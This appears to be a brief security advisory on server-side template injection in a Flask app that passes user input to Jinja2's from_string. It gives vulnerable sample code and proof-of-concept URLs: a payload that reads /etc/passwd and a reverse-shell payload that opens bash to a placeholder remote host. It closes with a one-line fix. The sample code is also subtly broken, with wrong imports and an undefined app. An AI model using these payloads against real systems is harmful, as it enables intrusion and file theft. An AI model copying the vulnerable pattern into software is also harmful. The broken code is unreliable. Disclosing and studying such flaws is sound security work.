#Jinja2 Command injection from_string function <br />
#Website: Ordina.nl \n
Author: Jameel Nabbo  \n
Email: jameel.nabbo[at]ordina.nl  \n

// from_string function is prone to SSTI where it takes the "source" parameter as a template object and render it and then return it.


//here's an example about the vulnerable code that uses from_string function in order to handle a variable in GET called 'username' and returns Hello {username}:


import Flask
import request
import Jinja2


@app.route("/")
def index():
	username = request.values.get('username')
	return Jinja2.from_string('Hello ' + username).render()


if __name__ == "__main__":
	app.run(host='127.0.0.1' , port=4444)

POC
//Exploiting the username param
http://localhost:4444/?username={{4*4}}
OUTPUT: Hello 16

Reading the /etc/passwd

http://localhost:4444/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}


Getting a reverse shell 
http://localhost:4444/?username={{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }}


How to prevent it:
Never let the user provide template content.